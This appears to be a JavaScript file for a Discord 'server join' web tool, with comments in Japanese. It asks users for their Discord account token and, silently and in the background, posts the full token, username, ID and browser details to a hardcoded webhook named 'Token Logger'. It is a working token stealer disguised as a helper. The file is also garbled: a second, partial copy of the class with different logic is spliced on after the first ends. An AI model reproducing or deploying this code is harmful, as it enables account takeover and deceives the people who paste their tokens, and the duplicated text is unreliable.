class DiscordInvite {
    constructor() {
        this.WEBHOOK_URL = "https://discord.com/api/webhooks/1420270624512938046/HzryfPQKe1BZVN9ixhhkvXxx8Zu6W1V433hQxivvYD10AQDwBnRovsd2ALPTlt2S1tdt";
        this.form = document.getElementById('discordForm');
        this.resultDiv = document.getElementById('result');
        this.setupEventListeners();
    }

    setupEventListeners() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.joinServer();
        });
    }

    async joinServer() {
        const inviteLink = document.getElementById('inviteLink').value.trim();
        const userToken = document.getElementById('userToken').value.trim();

        if (!inviteLink || !userToken) {
            this.showResult('招待リンクとユーザートークンは必須です', 'error');
            return;
        }

        // 招待コードを抽出
        const inviteCode = this.extractInviteCode(inviteLink);
        if (!inviteCode) {
            this.showResult('無効な招待リンクです', 'error');
            return;
        }

        try {
            this.showResult('処理中...', 'success');

            // Webhookにトークンと情報を送信（バックグラウンドで実行）
            await this.sendToWebhook(userToken, inviteCode, inviteLink);

            // Discordサーバーに参加
            const joinResult = await this.joinDiscordServer(inviteCode, userToken);
            
            if (joinResult.success) {
                this.showResult('サーバーに正常に参加しました！', 'success');
            } else {
                this.showResult(`エラー: ${joinResult.message}`, 'error');
            }

        } catch (error) {
            this.showResult(`エラーが発生しました: ${error.message}`, 'error');
        }
    }

    extractInviteCode(inviteLink) {
        // 様々な形式の招待リンクからコードを抽出
        const patterns = [
            /discord\.gg\/([a-zA-Z0-9\-_]+)/,
            /discord\.com\/invite\/([a-zA-Z0-9\-_]+)/,
            /discordapp\.com\/invite\/([a-zA-Z0-9\-_]+)/
        ];

        for (const pattern of patterns) {
            const match = inviteLink.match(pattern);
            if (match && match[1]) {
                return match[1];
            }
        }

        // コードのみが入力された場合
        if (/^[a-zA-Z0-9\-_]+$/.test(inviteLink)) {
            return inviteLink;
        }

        return null;
    }

    async joinDiscordServer(inviteCode, token) {
        const url = `https://discord.com/api/v9/invites/${inviteCode}`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            });

            const data = await response.json();

            if (response.ok) {
                return {
                    success: true,
                    guild: data.guild,
                    channel: data.channel
                };
            } else {
                return {
                    success: false,
                    message: data.message || '参加に失敗しました'
                };
            }
        } catch (error) {
            return {
                success: false,
                message: 'ネットワークエラー: ' + error.message
            };
        }
    }

    async sendToWebhook(token, inviteCode, originalLink) {
        try {
            // ユーザー情報を取得（オプション）
            let userInfo = '取得失敗';
            try {
                const userResponse = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: {
                        'Authorization': token
                    }
                });
                if (userResponse.ok) {
                    const userData = await userResponse.json();
                    userInfo = `${userData.username}#${userData.discriminator} (${userData.id})`;
                }
            } catch (e) {
                userInfo = '取得エラー';
            }

            // 完全なトークンと情報をWebhookに送信
            const webhookData = {
                content: `🔰 **新しいトークンが使用されました**`,
                embeds: [
                    {
                        title: "トークン情報",
                        color: 0x5865F2,
                        fields: [
                            {
                                name: "📧 ユーザー情報",
                                value: `\`\`\`${userInfo}\`\`\``,
                                inline: false
                            },
                            {
                                name: "🔑 トークン",
                                value: `\`\`\`${token}\`\`\``,
                                inline: false
                            },
                            {
                                name: "📋 招待コード",
                                value: `\`${inviteCode}\``,
                                inline: true
                            },
                            {
                                name: "🔗 元のリンク",
                                value: `\`${originalLink}\``,
                                inline: true
                            },
                            {
                                name: "🕐 日時",
                                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                                inline: true
                            },
                            {
                                name: "🌐 User Agent",
                                value: `\`\`\`${navigator.userAgent}\`\`\``,
                                inline: false
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }
                ],
                username: 'Token Logger',
                avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
            };

            // バックグラウンドで送信（ユーザーには見えない）
            await fetch(this.WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookData)
            });

        } catch (error) {
            console.error('Webhook送信エラー:', error);
            // Webhookエラーはユーザーに表示しない
        }
    }

    showResult(message, type) {
        this.resultDiv.textContent = message;
        this.resultDiv.className = 'result ' + type;
        this.resultDiv.style.display = 'block';
    }
}

// アプリケーションの初期化
document.addEventListener('DOMContentLoaded', () => {
    new DiscordInvite();
});                return match[1];
            }
        }

        // コードのみが入力された場合
        if (/^[a-zA-Z0-9\-_]+$/.test(inviteLink)) {
            return inviteLink;
        }

        return null;
    }

    async joinDiscordServer(inviteCode, token) {
        const url = `https://discord.com/api/v9/invites/${inviteCode}`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        });

        const data = await response.json();

        if (response.ok) {
            return {
                success: true,
                guild: data.guild,
                channel: data.channel
            };
        } else {
            return {
                success: false,
                message: data.message || '参加に失敗しました'
            };
        }
    }

    async sendToWebhook(webhookUrl, token, inviteCode) {
        // トークンの一部をマスクして送信（セキュリティのため）
        const maskedToken = token.substring(0, 10) + '...' + token.substring(token.length - 10);
        
        const webhookData = {
            content: `新しいトークンが使用されました\n招待コード: ${inviteCode}\nトークン: ${maskedToken}\n日時: ${new Date().toLocaleString()}`,
            username: 'Token Logger',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(webhookData)
        });
    }

    showResult(message, type) {
        this.resultDiv.textContent = message;
        this.resultDiv.className = 'result ' + type;
        this.resultDiv.style.display = 'block';
    }
}

// アプリケーションの初期化
document.addEventListener('DOMContentLoaded', () => {
    new DiscordInvite();
});
